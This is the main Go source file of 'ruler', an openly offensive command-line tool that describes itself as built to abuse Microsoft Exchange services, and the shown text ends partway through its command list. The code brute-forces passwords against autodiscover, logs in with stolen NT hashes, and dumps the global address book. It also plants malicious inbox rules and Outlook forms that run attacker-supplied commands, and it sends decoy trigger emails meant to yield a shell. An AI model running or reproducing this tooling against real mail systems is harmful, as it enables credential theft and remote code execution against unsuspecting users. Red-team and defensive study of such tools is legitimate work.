package main

import (
	"bufio"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/howeyc/gopass"
	"github.com/sensepost/ruler/autodiscover"
	"github.com/sensepost/ruler/forms"
	"github.com/sensepost/ruler/mapi"
	"github.com/sensepost/ruler/utils"
	"github.com/urfave/cli"
)

//globals
var config utils.Session

func exit(err error) {
	//we had an error
	if err != nil {
		utils.Error.Println(err)
	}

	//let's disconnect from the MAPI session
	exitcode, err := mapi.Disconnect()
	if err != nil {
		utils.Error.Println(err)
	}
	os.Exit(exitcode)
}

//function to perform a bruteforce
func brute(c *cli.Context) error {
	if c.String("users") == "" && c.String("userpass") == "" {
		return fmt.Errorf("Either --users or --userpass required")
	}
	if c.String("passwords") == "" && c.String("userpass") == "" {
		return fmt.Errorf("Either --passwords or --userpass required")

	}
	if c.GlobalString("domain") == "" && c.GlobalString("url") == "" {
		return fmt.Errorf("Either --domain or --url required")
	}

	utils.Info.Println("Starting bruteforce")
	userpass := c.String("userpass")

	if userpass == "" {
		if c.GlobalString("domain") != "" {
			autodiscover.BruteForce(c.GlobalString("domain"), c.String("users"), c.String("passwords"), c.GlobalBool("basic"), c.GlobalBool("insecure"), c.Bool("stop"), c.Bool("verbose"), c.Int("attempts"), c.Int("delay"))
		} else {
			autodiscover.BruteForce(c.GlobalString("url"), c.String("users"), c.String("passwords"), c.GlobalBool("basic"), c.GlobalBool("insecure"), c.Bool("stop"), c.Bool("verbose"), c.Int("attempts"), c.Int("delay"))
		}
	} else {
		if c.GlobalString("domain") != "" {
			autodiscover.UserPassBruteForce(c.GlobalString("domain"), c.String("userpass"), c.GlobalBool("basic"), c.GlobalBool("insecure"), c.Bool("stop"), c.Bool("verbose"), c.Int("attempts"), c.Int("delay"))
		} else {
			autodiscover.UserPassBruteForce(c.GlobalString("url"), c.String("userpass"), c.GlobalBool("basic"), c.GlobalBool("insecure"), c.Bool("stop"), c.Bool("verbose"), c.Int("attempts"), c.Int("delay"))
		}
	}
	return nil
}

//Function to add new rule
func addRule(c *cli.Context) error {
	utils.Info.Println("Adding Rule")

	res, err := mapi.ExecuteMailRuleAdd(c.String("name"), c.String("trigger"), c.String("location"), true)
	if err != nil || res.StatusCode == 255 {
		return fmt.Errorf("Failed to create rule. %s", err)
	}

	utils.Info.Println("Rule Added. Fetching list of rules...")

	printRules()

	if c.Bool("send") {
		utils.Info.Println("Auto Send enabled, wait 30 seconds before sending email (synchronisation)")
		//initate a ping sequence, just incase we are on RPC/HTTP
		//we need to keep the socket open
		go mapi.Ping()
		time.Sleep(time.Second * (time.Duration)(30))
		utils.Info.Println("Sending email")
		if c.String("subject") == "" {
			sendMessage(c.String("trigger"), c.String("body"))
		} else {
			sendMessage(c.String("subject"), c.String("body"))
		}

	}

	return nil
}

//Function to delete a rule
func deleteRule(c *cli.Context) error {
	var ruleid []byte
	var err error

	if c.String("id") == "" && c.String("name") != "" {
		rules, er := mapi.DisplayRules()
		if er != nil {
			return er
		}
		utils.Info.Printf("Found %d rules. Extracting ids\n", len(rules))
		for _, v := range rules {
			if utils.FromUnicode(v.RuleName) == c.String("name") {
				reader := bufio.NewReader(os.Stdin)
				utils.Question.Printf("Delete rule with id %x [y/N]: ", v.RuleID)
				ans, _ := reader.ReadString('\n')
				if ans == "y\n" || ans == "Y\n" || ans == "yes\n" {
					ruleid = v.RuleID
					err = mapi.ExecuteMailRuleDelete(ruleid)
					if err != nil {
						utils.Error.Printf("Failed to delete rule")
					}
				}
			}
		}
		if ruleid == nil {
			return fmt.Errorf("No rule with supplied name found")
		}
	} else {
		ruleid, err = hex.DecodeString(c.String("id"))
		if err != nil {
			return fmt.Errorf("Incorrect ruleid format. Try --name if you wish to supply a rule's name rather than id")
		}
		err = mapi.ExecuteMailRuleDelete(ruleid)
		if err != nil {
			utils.Error.Printf("Failed to delete rule")
		}
	}

	if err == nil {
		utils.Info.Println("Fetching list of remaining rules...")
		er := printRules()
		if er != nil {
			return er
		}
	}
	return err
}

//Function to display all rules
func displayRules(c *cli.Context) error {
	utils.Info.Println("Retrieving Rules")
	er := printRules()
	return er
}

//sendMessage sends a message to the user, using their own Account
//uses supplied subject and body
func sendMessage(subject, body string) error {

	propertyTags := make([]mapi.PropertyTag, 1)
	propertyTags[0] = mapi.PidTagDisplayName

	_, er := mapi.GetFolder(mapi.OUTBOX, nil) //propertyTags)
	if er != nil {
		return er
	}
	_, er = mapi.SendMessage(subject, body)
	if er != nil {
		return er
	}
	utils.Info.Println("Message sent, your shell should trigger shortly.")

	return nil
}

//Function to connect to the Exchange server
func connect(c *cli.Context) error {
	var err error
	//if no password or hash was supplied, read from stdin
	if c.GlobalString("password") == "" && c.GlobalString("hash") == "" && c.GlobalString("config") == "" {
		fmt.Printf("Password: ")
		var pass []byte
		pass, err = gopass.GetPasswd()
		if err != nil {
			// Handle gopass.ErrInterrupted or getch() read error
			return fmt.Errorf("Password or hash required. Supply NTLM hash with --hash")
		}
		config.Pass = string(pass)
	} else {
		config.Pass = c.GlobalString("password")
		if config.NTHash, err = hex.DecodeString(c.GlobalString("hash")); err != nil {
			return fmt.Errorf("Invalid hash provided. Hex decode failed")
		}

	}
	//setup our autodiscover service
	config.Domain = c.GlobalString("domain")
	config.User = c.GlobalString("username")
	config.Email = c.GlobalString("email")
	config.Basic = c.GlobalBool("basic")
	config.Insecure = c.GlobalBool("insecure")
	config.Verbose = c.GlobalBool("verbose")
	config.Admin = c.GlobalBool("admin")
	config.RPCEncrypt = !c.GlobalBool("noencrypt")
	config.CookieJar, _ = cookiejar.New(nil)

	//add supplied cookie to the cookie jar
	if c.GlobalString("cookie") != "" {
		//split into cookies and then into name : value
		cookies := strings.Split(c.GlobalString("cookie"), ";")
		var cookieJarTmp []*http.Cookie
		var cdomain string
		//split and get the domain from the email
		if eparts := strings.Split(c.GlobalString("email"), "@"); len(eparts) == 2 {
			cdomain = eparts[1]
		} else {
			return fmt.Errorf("[x] Invalid email address")
		}

		for _, v := range cookies {
			cookie := strings.Split(v, "=")
			c := &http.Cookie{
				Name:   cookie[0],
				Value:  cookie[1],
				Path:   "/",
				Domain: cdomain,
			}
			cookieJarTmp = append(cookieJarTmp, c)
		}
		u, _ := url.Parse(fmt.Sprintf("https://%s/", cdomain))
		config.CookieJar.SetCookies(u, cookieJarTmp)
	}

	config.CookieJar, _ = cookiejar.New(nil)

	//add supplied cookie to the cookie jar
	if c.GlobalString("cookie") != "" {
		//split into cookies and then into name : value
		cookies := strings.Split(c.GlobalString("cookie"), ";")
		var cookieJarTmp []*http.Cookie
		var cdomain string
		//split and get the domain from the email
		if eparts := strings.Split(c.GlobalString("email"), "@"); len(eparts) == 2 {
			cdomain = eparts[1]
		} else {
			return fmt.Errorf("Invalid email address")
		}

		for _, v := range cookies {
			cookie := strings.Split(v, "=")
			c := &http.Cookie{
				Name:   cookie[0],
				Value:  cookie[1],
				Path:   "/",
				Domain: cdomain,
			}
			cookieJarTmp = append(cookieJarTmp, c)
		}
		u, _ := url.Parse(fmt.Sprintf("https://%s/", cdomain))
		config.CookieJar.SetCookies(u, cookieJarTmp)
	}

	url := c.GlobalString("url")

	if c.GlobalBool("o365") == true {
		url = "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml"
	}

	autodiscover.SessionConfig = &config

	var resp *utils.AutodiscoverResp
	var rawAutodiscover string

	var mapiURL, abkURL, userDN string

	//try connect to MAPI/HTTP first -- this is faster and the code-base is more stable
	//unless of course the global "RPC" flag has been set, which specifies we should just use
	//RPC/HTTP from the get-go
	if c.GlobalString("config") != "" {
		var yamlConfig utils.YamlConfig
		if yamlConfig, err = utils.ReadYml(c.GlobalString("config")); err != nil {
			utils.Error.Println("Invalid Config file.")
			return err
		}

		//set all fields from yamlConfig into config (this overrides cmdline options)
		if yamlConfig.Username != "" {
			config.User = yamlConfig.Username
		}
		if yamlConfig.Password != "" {
			config.Pass = yamlConfig.Password
		}
		if yamlConfig.Email != "" {
			config.Email = yamlConfig.Email
		}
		if yamlConfig.Hash != "" {
			if config.NTHash, err = hex.DecodeString(yamlConfig.Hash); err != nil {
				return fmt.Errorf("Invalid hash provided. Hex decode failed")
			}
		}

		if config.User == "" && config.Email == "" {
			return fmt.Errorf("Missing username and/or email argument. Use --domain (if needed), --username and --email or the --config")
		}

		if config.Pass == "" {
			fmt.Printf("Password: ")
			var pass []byte
			pass, err = gopass.GetPasswd()
			if err != nil {
				// Handle gopass.ErrInterrupted or getch() read error
				return fmt.Errorf("Password or hash required. Supply NTLM hash with --hash")
			}
			config.Pass = string(pass)
		}

		if yamlConfig.RPC == true {
			//create RPC URL
			config.RPCURL = fmt.Sprintf("%s?%s:6001", yamlConfig.RPCURL, yamlConfig.Mailbox)
			config.RPCEncrypt = yamlConfig.RPCEncrypt
			config.RPCNtlm = yamlConfig.Ntlm
		} else {
			mapiURL = fmt.Sprintf("%s?MailboxId=%s", yamlConfig.MapiURL, yamlConfig.Mailbox)
		}
		userDN = yamlConfig.UserDN

	} else if !c.GlobalBool("rpc") {

		if config.User == "" && config.Email == "" {
			return fmt.Errorf("Missing username and/or email argument. Use --domain (if needed), --username and --email or the --config")
		}

		if c.GlobalBool("nocache") == false { //unless user specified nocache, check cache for existing autodiscover
			resp = autodiscover.CheckCache(config.Email)
		}
		if resp == nil {
			resp, rawAutodiscover, err = autodiscover.GetMapiHTTP(config.Email, url, resp)
			if err != nil {
				exit(err)
			}
		}
		mapiURL = mapi.ExtractMapiURL(resp)
		abkURL = mapi.ExtractMapiAddressBookURL(resp)
		userDN = resp.Response.User.LegacyDN

		if mapiURL == "" { //try RPC
			//fmt.Println("No MAPI URL found. Trying RPC/HTTP")
			resp, _, config.RPCURL, config.RPCMailbox, config.RPCNtlm, err = autodiscover.GetRPCHTTP(config.Email, url, resp)
			if err != nil {
				exit(err)
			}
			if resp.Response.User.LegacyDN == "" {
				return fmt.Errorf("Both MAPI/HTTP and RPC/HTTP failed. Are the credentials valid? \n%s", resp.Response.Error)
			}

			if c.GlobalBool("nocache") == false {
				autodiscover.CreateCache(config.Email, rawAutodiscover) //store the autodiscover for future use
			}
		} else {

			utils.Trace.Println("MAPI URL found: ", mapiURL)
			utils.Trace.Println("MAPI AddressBook URL found: ", abkURL)

			//mapi.Init(&config, userDN, mapiURL, abkURL, mapi.HTTP)
			if c.GlobalBool("nocache") == false {
				autodiscover.CreateCache(config.Email, rawAutodiscover) //store the autodiscover for future use
			}
		}

	} else {
		if config.User == "" && config.Email == "" {
			return fmt.Errorf("Missing username and/or email argument. Use --domain (if needed), --username and --email or the --config")
		}

		utils.Trace.Println("RPC/HTTP forced, trying RPC/HTTP")
		if c.GlobalBool("nocache") == false { //unless user specified nocache, check cache for existing autodiscover
			resp = autodiscover.CheckCache(config.Email)
		}
		if resp == nil {
			resp, rawAutodiscover, config.RPCURL, config.RPCMailbox, config.RPCNtlm, err = autodiscover.GetRPCHTTP(config.Email, url, resp)
			if err != nil {
				exit(err)
			}
		}
		userDN = resp.Response.User.LegacyDN

		if c.GlobalBool("nocache") == false {
			autodiscover.CreateCache(config.Email, rawAutodiscover) //store the autodiscover for future use
		}
	}

	if config.RPCURL != "" {
		mapi.Init(&config, userDN, "", "", mapi.RPC)
	} else {
		mapi.Init(&config, userDN, mapiURL, abkURL, mapi.HTTP)
	}

	//now we should do the login
	logon, err := mapi.Authenticate()

	if err != nil {
		exit(err)
	} else if logon.MailboxGUID != nil {

		utils.Trace.Println("And we are authenticated")
		utils.Trace.Println("Openning the Inbox")

		propertyTags := make([]mapi.PropertyTag, 2)
		propertyTags[0] = mapi.PidTagDisplayName
		propertyTags[1] = mapi.PidTagSubfolders
		mapi.GetFolder(mapi.INBOX, propertyTags) //Open Inbox
	}
	return nil
}

func printRules() error {
	rules, er := mapi.DisplayRules()

	if er != nil {
		return er
	}

	if len(rules) > 0 {
		utils.Info.Printf("Found %d rules\n", len(rules))
		maxwidth := 30

		for _, v := range rules {
			if len(string(v.RuleName)) > maxwidth {
				maxwidth = len(string(v.RuleName))
			}
		}
		maxwidth -= 10
		fmstr1 := fmt.Sprintf("%%-%ds | %%-s\n", maxwidth)
		fmstr2 := fmt.Sprintf("%%-%ds | %%x\n", maxwidth)
		utils.Info.Printf(fmstr1, "Rule Name", "Rule ID")
		utils.Info.Printf("%s|%s\n", (strings.Repeat("-", maxwidth+1)), strings.Repeat("-", 18))
		for _, v := range rules {
			utils.Info.Printf(fmstr2, string(utils.FromUnicode(v.RuleName)), v.RuleID)
		}
		utils.Info.Println()
	} else {
		utils.Info.Printf("No Rules Found\n")
	}
	return nil
}

//Function to display all addressbook entries
func abkList(c *cli.Context) error {
	utils.Trace.Println("Let's play addressbook")
	if config.Transport == mapi.RPC {
		return fmt.Errorf("Only MAPI/HTTP is currently supported for addressbook interaction")
	}

	mapi.BindAddressBook()

	columns := make([]mapi.PropertyTag, 2)
	columns[0] = mapi.PidTagDisplayName
	columns[1] = mapi.PidTagSMTPAddress
	rows, _ := mapi.QueryRows(100, []byte{}, columns) //pull first 255 entries
	utils.Info.Println("Found the following entries: ")
	maxwidth := 30
	fmstr1 := fmt.Sprintf("%%-%ds | %%-s\n", maxwidth)
	fmstr2 := fmt.Sprintf("%%-%ds | %%s\n", maxwidth)
	utils.Info.Printf(fmstr1, "Display Name", "SMTP Address")
	utils.Info.Printf("%s|%s\n", (strings.Repeat("-", maxwidth+1)), strings.Repeat("-", 18))
	for k := 0; k < int(rows.RowCount); k++ {
		if len(rows.RowData[k].AddressBookPropertyValue) == 2 {
			disp := utils.FromUnicode(rows.RowData[k].AddressBookPropertyValue[0].Value)
			if len(disp) > maxwidth {
				disp = disp[:maxwidth-2]
			}
			utils.Clear.Printf(fmstr2, string(disp), rows.RowData[k].AddressBookPropertyValue[1].Value)
		}
	}
	state := mapi.STAT{}
	state.Unmarshal(rows.State)
	totalrows := state.TotalRecs
	for i := 0; i < int(totalrows); i += 100 {
		rows, _ = mapi.QueryRows(100, rows.State, columns)
		for k := 0; k < int(rows.RowCount); k++ {
			if len(rows.RowData[k].AddressBookPropertyValue) == 2 {
				disp := utils.FromUnicode(rows.RowData[k].AddressBookPropertyValue[0].Value)
				if len(disp) > maxwidth {
					disp = disp[:maxwidth-2]
				}
				utils.Clear.Printf(fmstr2, string(disp), rows.RowData[k].AddressBookPropertyValue[1].Value)
			}
		}
	}
	return nil
}

//Function to display all addressbook entries
func abkDump(c *cli.Context) error {
	if config.Transport == mapi.RPC {
		return fmt.Errorf("Address book support is currently limited to MAPI/HTTP")
	}
	utils.Trace.Println("Let's Dump the addressbook")
	fout, err := os.OpenFile(c.String("output"), os.O_CREATE|os.O_WRONLY, 0666)
	if err != nil {
		return fmt.Errorf("Couldn't create file to write to... %s", err)
	}

	mapi.BindAddressBook()
	columns := make([]mapi.PropertyTag, 2)
	columns[0] = mapi.PidTagDisplayName
	columns[1] = mapi.PidTagSMTPAddress
	rows, _ := mapi.QueryRows(100, []byte{}, columns) //pull first 255 entries

	for k := 0; k < int(rows.RowCount); k++ {
		if len(rows.RowData[k].AddressBookPropertyValue) == 2 {
			disp := utils.FromUnicode(rows.RowData[k].AddressBookPropertyValue[0].Value)
			email := utils.FromUnicode(rows.RowData[k].AddressBookPropertyValue[1].Value)
			if _, err := fout.WriteString(fmt.Sprintf("%s , %s\n", disp, email)); err != nil {
				return fmt.Errorf("Couldn't write to file... %s", err)
			}
		}
	}
	state := mapi.STAT{}
	state.Unmarshal(rows.State)
	totalrows := state.TotalRecs
	utils.Info.Printf("Found %d entries in the GAL. Dumping...", totalrows)
	for i := 0; i < int(totalrows); i += 100 {
		rows, _ = mapi.QueryRows(100, rows.State, columns)
		utils.Info.Printf("Dumping %d/%d", i+100, totalrows)
		for k := 0; k < int(rows.RowCount); k++ {
			if len(rows.RowData[k].AddressBookPropertyValue) == 2 {
				disp := utils.FromUnicode(rows.RowData[k].AddressBookPropertyValue[0].Value)
				email := utils.FromUnicode(rows.RowData[k].AddressBookPropertyValue[1].Value)
				if _, err := fout.WriteString(fmt.Sprintf("%s | %s\n", disp, email)); err != nil {
					return fmt.Errorf("Couldn't write to file... %s", err)
				}
			}
		}
	}
	return nil
}

func createForm(c *cli.Context) error {
	//first check that supplied command is valid
	var command string
	if c.String("input") != "" {
		cmd, err := utils.ReadFile(c.String("input"))
		if err != nil {
			return err
		}
		command = string(cmd)
	} else {
		command = c.String("command")
	}

	if len(command) > 4096 {
		return fmt.Errorf("Command is too large. Maximum command size is 4096 characters.")
	}

	suffix := c.String("suffix")
	folderid := mapi.AuthSession.Folderids[mapi.INBOX]

	utils.Trace.Println("Verifying that form does not exist.")
	//check that form does not already exist
	if err := forms.CheckForm(folderid, suffix); err != nil {
		return err
	}
	var rname, triggerword string
	if c.Bool("rule") == true {
		rname = utils.GenerateString(6)
		triggerword = utils.GenerateString(8)
	} else {
		rname = "NORULE"
	}

	msgid, err := forms.CreateFormMessage(suffix, rname)
	if err != nil {
		return err
	}

	if err := forms.CreateFormAttachmentPointer(folderid, msgid); err != nil {
		return err
	}
	if err := forms.CreateFormAttachmentTemplate(folderid, msgid, command); err != nil {
		return err
	}
	utils.Info.Println("Form created successfully")

	if c.Bool("rule") == true {
		utils.Info.Printf("Rule trigger set. Adding new rule with name %s\n", rname)
		utils.Info.Printf("Adding new rule with trigger of %s\n", triggerword)

		//create delete rule
		if _, err := mapi.ExecuteDeleteRuleAdd(rname, triggerword); err != nil {
			utils.Error.Println("Failed to create the trigger rule")
		} else {
			utils.Info.Println("Trigger rule created.")
		}

		if c.Bool("send") == false {
			utils.Info.Printf("Autosend disabled. You'll need to trigger the rule by sending an email with the keyword \"%s\" present in the subject. \n", triggerword)
		}
		c.Set("subject", triggerword)
	}

	//trigger the email if the send option is enabled
	if c.Bool("send") == true {
		return triggerForm(c)
	}
	return nil
}

func triggerForm(c *cli.Context) error {
	subject := c.String("subject")
	body := c.String("body")
	suffix := c.String("suffix")
	folderid := mapi.AuthSession.Folderids[mapi.INBOX]
	target := c.GlobalString("email")

	utils.Trace.Println("Creating Trigger message.")
	msgid, err := forms.CreateFormTriggerMessage(suffix, subject, body)
	if err != nil {
		return err
	}
	utils.Info.Println("Sending email.")
	//send to another account
	if c.String("target") != "" {
		target = c.String("target")
	}

	if _, err = mapi.SendExistingMessage(folderid, msgid, target); err != nil {
		return err
	}
	utils.Info.Println("Email sent! Hopefully you will have a shell soon.")
	return nil
}

func deleteForm(c *cli.Context) error {
	suffix := c.String("suffix")
	folderid := mapi.AuthSession.Folderids[mapi.INBOX]

	if _, err := forms.DeleteForm(suffix, folderid); err != nil {
		utils.Error.Println("Failed to delete form.")
		return err
	}

	return nil
}

func displayForms(c *cli.Context) error {
	folderid := mapi.AuthSession.Folderids[mapi.INBOX]

	if err := forms.DisplayForms(folderid); err != nil {
		utils.Error.Println("Failed to find any forms.")
		return err
	}
	return nil
}

func main() {

	app := cli.NewApp()

	app.Name = "ruler"
	app.Usage = "A tool to abuse Exchange Services"
	app.Version = "2.1.6"
	app.Author = "Etienne Stalmans <etienne@sensepost.com>, @_staaldraad"
	app.Description = `         _
 _ __ _   _| | ___ _ __
| '__| | | | |/ _ \ '__|
| |  | |_| | |  __/ |
|_|   \__,_|_|\___|_|

A tool by @_staaldraad from @sensepost to abuse Exchange Services.`

	app.Flags = []cli.Flag{
		cli.StringFlag{
			Name:  "domain,d",
			Value: "",
			Usage: "A domain for the user (optional in most cases. Otherwise allows: domain\\username)",
		},
		cli.BoolFlag{
			Name:  "o365",
			Usage: "We know the target is on Office365, so authenticate directly against that.",
		},
		cli.StringFlag{
			Name:  "username,u",
			Value: "",
			Usage: "A valid username",
		},
		cli.StringFlag{
			Name:  "password,p",
			Value: "",
			Usage: "A valid password",
		},
		cli.StringFlag{
			Name:  "hash",
			Value: "",
			Usage: "A NT hash for pass the hash",
		},
		cli.StringFlag{
			Name:  "email,e",
			Value: "",
			Usage: "The target's email address",
		},
		cli.StringFlag{
			Name:  "cookie",
			Value: "",
			Usage: "Any third party cookies such as SSO that are needed",
		},
		cli.StringFlag{
			Name:  "config",
			Value: "",
			Usage: "The path to a config file to use",
		},
		cli.StringFlag{
			Name:  "url",
			Value: "",
			Usage: "If you know the Autodiscover URL or the autodiscover service is failing. Requires full URI, https://autodisc.d.com/autodiscover/autodiscover.xml",
		},
		cli.BoolFlag{
			Name:  "insecure,k",
			Usage: "Ignore server SSL certificate errors",
		},
		cli.BoolFlag{
			Name:  "noencrypt",
			Usage: "Don't use encryption the RPC level - some environments require this",
		},
		cli.BoolFlag{
			Name:  "basic,b",
			Usage: "Force Basic authentication",
		},
		cli.BoolFlag{
			Name:  "admin",
			Usage: "Login as an admin",
		},
		cli.BoolFlag{
			Name:  "nocache",
			Usage: "Don't use the cached autodiscover record",
		},
		cli.BoolFlag{
			Name:  "rpc",
			Usage: "Force RPC/HTTP rather than MAPI/HTTP",
		},
		cli.BoolFlag{
			Name:  "verbose",
			Usage: "Be verbose and show some of thei inner workings",
		},
		cli.BoolFlag{
			Name:  "debug",
			Usage: "Be print debug info",
		},
	}

	app.Before = func(c *cli.Context) error {
		if c.Bool("verbose") == true && c.Bool("debug") == false {
			utils.Init(os.Stdout, os.Stdout, ioutil.Discard, os.Stderr)
		} else if c.Bool("verbose") == false && c.Bool("debug") == true {
			utils.Init(ioutil.Discard, os.Stdout, os.Stdout, os.Stderr)
		} else if c.Bool("debug") == true {
			utils.Init(os.Stdout, os.Stdout, os.Stdout, os.Stderr)
		} else {
			utils.Init(ioutil.Discard, os.Stdout, os.Stdout, os.Stderr)
		}
		return nil
	}

	app.Commands = []cli.Command{
		{
			Name:    "add",
			Aliases: []string{"a"},
			Usage:   "add a new rule",
			Flags: []cli.Flag{
				cli.StringFlag{
					Name:  "name,n",
					Value: "Delete Spam",
					Usage: "A name for our rule",
				},
				cli.StringFlag{
					Name:  "trigger,t",
					Value: "Hey John",
					Usage: "A trigger word or phrase - this is going to be the subject of our trigger email",
				},
				cli.StringFlag{
					Name:  "location,l",
					Value: "C:\\Windows\\System32\\calc.exe",
					Usage: "The location of our application to launch. Typically a WEBDAV URI",
				},
				cli.BoolFlag{
					Name:  "send,s",
					Usage: "Trigger the rule by sending an email to the target",
				},
				cli.StringFlag{
					Name:  "body,b",
					Value: "**Automated account check - please ignore**\r\n\r\nMicrosoft Exchange has run an automated test on your account.\r\nEverything seems to be configured correctly.",
					Usage: "The email body you may wish to use",
				},
				cli.StringFlag{
					Name:  "subject",
					Value: "",
					Usage: "The subject you wish to use, this should contain your trigger word.",
				},
			},
			Action: func(c *cli.Context) error {
				//check that name, trigger and location were supplied
				if c.String("name") == "" || c.String("trigger") == "" || c.String("location") == "" {
					cli.NewExitError("Missing rule item. Use --name, --trigger and --location", 1)
					cli.OsExiter(1)
				}

				err := connect(c)
				if err != nil {
					utils.Error.Println(err)
					cli.OsExiter(1)
				}
				err = addRule(c)
				exit(err)

				return nil
			},
		},
		{
			Name:    "delete",
			Aliases: []string{"r"},
			Usage:   "delete an existing rule",
			Flags: []cli.Flag{
				cli.StringFlag{
					Name:  "id",
					Value: "",
					Usage: "The ID of the rule to delete",
				},
				cli.StringFlag{
					Name:  "name",
					Value: "",
					Usage: "The name of the rule to delete",
				},
			},
			Action: func(c *cli.Context) error {
				//check that ID was supplied
				if c.String("id") == "" && c.String("name") == "" {
					return cli.NewExitError("Rule id or name required. Use --id or --name", 1)
				}
				err := connect(c)
				if err != nil {
					utils.Error.Println(err)
					cli.OsExiter(1)
				}
				err = deleteRule(c)

				exit(err)

				return nil
			},
		},
		{
			Name:    "display",
			Aliases: []string{"d"},
			Usage:   "display all existing rules",
			Action: func(c *cli.Context) error {
				err := connect(c)
				if err != nil {
					utils.Error.Println(err)
					cli.OsExiter(1)
				}
				err = displayRules(c)
				exit(err)

				return nil
			},
		},
		{
			Name:    "check",
			Aliases: []string{"c"},
			Usage:   "Check if the credentials work and we can interact with the mailbox",
			Action: func(c *cli.Context) error {
				err := connect(c)
				if err != nil {
					utils.Error.Println(err)
					cli.OsExiter(1)
				}
				utils.Info.Println("Looks like we are good to go!")
				return nil
			},
		},
		{
			Name:    "send",
			Aliases: []string{"s"},
			Usage:   "Send an email to trigger an existing rule. This uses the target user's own account.",
			Flags: []cli.Flag{
				cli.StringFlag{
					Name:  "subject,s",
					Value: "",
					Usage: "A subject to use, this should contain our trigger word",
				},
				cli.StringFlag{
					Name:  "body,b",
					Value: "**Automated account check - please ignore**\r\nMicrosoft Exchange has run an automated test on your account.\r\nEverything seems to be configured correctly.",
					Usage: "The email body you may wish to use",
				},
			},
			Action: func(c *cli.Context) error {
				//check that trigger word was supplied
				if c.String("subject") == "" {
					return cli.NewExitError("The subject is required. Use --subject", 1)
				}
				err := connect(c)
				if err != nil {
					utils.Error.Println(err)
					cli.OsExiter(1)
				}
				err = sendMessage(c.String("subject"), c.String("body"))
				exit(err)
				return nil
			},
		},
		{
			Name:    "brute",
			Aliases: []string{"b"},
			Usage:   "Do a bruteforce attack against the autodiscover service to find valid username/passwords",
			Flags: []cli.Flag{
				cli.StringFlag{
					Name:  "users,u",
					Value: "",
					Usage: "Filename for a username list (one name per line)",
				},
				cli.StringFlag{
					Name:  "passwords,p",
					Value: "",
					Usage: "Filename for a password list (one password per line)",
				},
				cli.StringFlag{
					Name:  "userpass",
					Value: "",
					Usage: "Filename for a username:password list (one per line)",
				},
				cli.IntFlag{
					Name:  "attempts,a",
					Value: 3,
					Usage: "Number of attempts before delay",
				},
				cli.IntFlag{
					Name:  "delay,d",
					Value: 5,
					Usage: "Number of seconds to delay between attempts",
				},
				cli.BoolFlag{
					Name:  "stop,s",
					Usage: "Stop on success",
				},
				cli.BoolFlag{
					Name:  "verbose,v",
					Usage: "Display each attempt",
				},
			},
			Action: func(c *cli.Context) error {
				err := brute(c)
				if err != nil {
					utils.Error.Println(err)
					cli.OsExiter(1)
				}
				return nil
			},
		},
		{
			Name:  "abk",
			Usage: "Interact with the Global Address Book",
			Subcommands: []cli.Command{
				{
					Name:  "list",
					Usage: "list the entries of the GAL",
					Action: func(c *cli.Context) error {
						err := connect(c)
						if err != nil {
							utils.Error.Println(err)
							cli.OsExiter(1)
						}
						err = abkList(c)
						exit(err)
						return nil
					},
				},
				{
					Name:  "dump",
					Usage: "dump the entries of the GAL and save to local file",
					Flags: []cli.Flag{
						cli.StringFlag{
							Name:  "output,o",
							Value: "",
							Usage: "File to save the GAL to",
						},
					},
					Action: func(c *cli.Context) error {
						if c.String("output") == "" {
							return cli.NewExitError("The file to save to is required. Use --output or -o", 1)
						}
						err := connect(c)
						if err != nil {
							utils.Error.Println(err)
							cli.OsExiter(1)
						}
						err = abkDump(c)
						exit(err)
						return nil
					},
				},
			},
		},
		{
			Name:  "form",
			Usage: "Interact with the forms function.",
			Subcommands: []cli.Command{
				{
					Name:  "add",
					Usage: "creates a new form. ",
					Flags: []cli.Flag{
						cli.StringFlag{
							Name:  "suffix",
							Value: "pew",
							Usage: "A 3 character suffix for the form. Defaults to pew",
						},
						cli.StringFlag{
							Name:  "command,c",
							Value: "",
							Usage: "The command to execute.",
						},
						cli.StringFlag{
							Name:  "input,i",
							Value: "",
							Usage: "A path to a file containing the command to execute. This takes precidence over 'command'",
						},
						cli.BoolFlag{
							Name:  "send,s",
							Usage: "Trigger the form once it's been created.",
						},
						cli.BoolFlag{
							Name:  "rule,r",
							Usage: "Trigger the form with a rule. This will add a new rule!",
						},
						cli.StringFlag{
							Name:  "body,b",
							Value: "This message cannot be displayed in the previewer.\n\n\n\n\n",
							Usage: "The email body you may wish to use",
						},
						cli.StringFlag{
							Name:  "subject",
							Value: "Invoice [Confidential]",
							Usage: "The subject you wish to use, this should contain your trigger word.",
						},
					},
					Action: func(c *cli.Context) error {
						if c.String("suffix") == "" {
							return cli.NewExitError("The suffix is needs to be set.", 1)
						}
						if c.String("command") == "" && c.String("input") == "" {
							utils.Error.Println("Please supply a valid command.\nSample:\nCreateObject(\"WScript.Shell\").Run \"calc.exe\", 0, False")
							return cli.NewExitError("No command supplied", 1)
						}

						err := connect(c)
						if err != nil {
							utils.Error.Println(err)
							cli.OsExiter(1)
						}
						err = createForm(c)
						exit(err)
						return nil
					},
				},
				{
					Name:  "send",
					Usage: "send an email to an existing form and trigger it",
					Flags: []cli.Flag{
						cli.StringFlag{
							Name:  "suffix,s",
							Value: "",
							Usage: "The suffix used when creating the form. This must be the same as the value used when the form was created.",
						},
						cli.StringFlag{
							Name:  "body,b",
							Value: "This message cannot be displayed in the previewer.\n\n\n\n\n",
							Usage: "The email body you may wish to use",
						},
						cli.StringFlag{
							Name:  "subject",
							Value: "Invoice [Confidential]",
							Usage: "The subject you wish to use, this should contain your trigger word.",
						},
						cli.StringFlag{
							Name:  "target",
							Value: "",
							Usage: "Send the email to another account.",
						},
					},
					Action: func(c *cli.Context) error {
						if c.String("suffix") == "" {
							return cli.NewExitError("The suffix is required. Please use the same value as supplied to the 'add' command. Default is pew", 1)
						}

						err := connect(c)
						if err != nil {
							utils.Error.Println(err)
							cli.OsExiter(1)
						}
						err = triggerForm(c)
						exit(err)
						return nil
					},
				},
				{
					Name:  "delete",
					Usage: "delete an existing form",
					Flags: []cli.Flag{
						cli.StringFlag{
							Name:  "suffix,s",
							Value: "",
							Usage: "The suffix used when creating the form. This must be the same as the value used when the form was created.",
						},
					},
					Action: func(c *cli.Context) error {
						if c.String("suffix") == "" {
							return cli.NewExitError("The suffix is required. Please use the same value as supplied to the 'add' command. Default is pew", 1)
						}

						err := connect(c)
						if err != nil {
							utils.Error.Println(err)
							cli.OsExiter(1)
						}
						err = deleteForm(c)
						exit(err)
						return nil
					},
				},
				{
					Name:  "display",
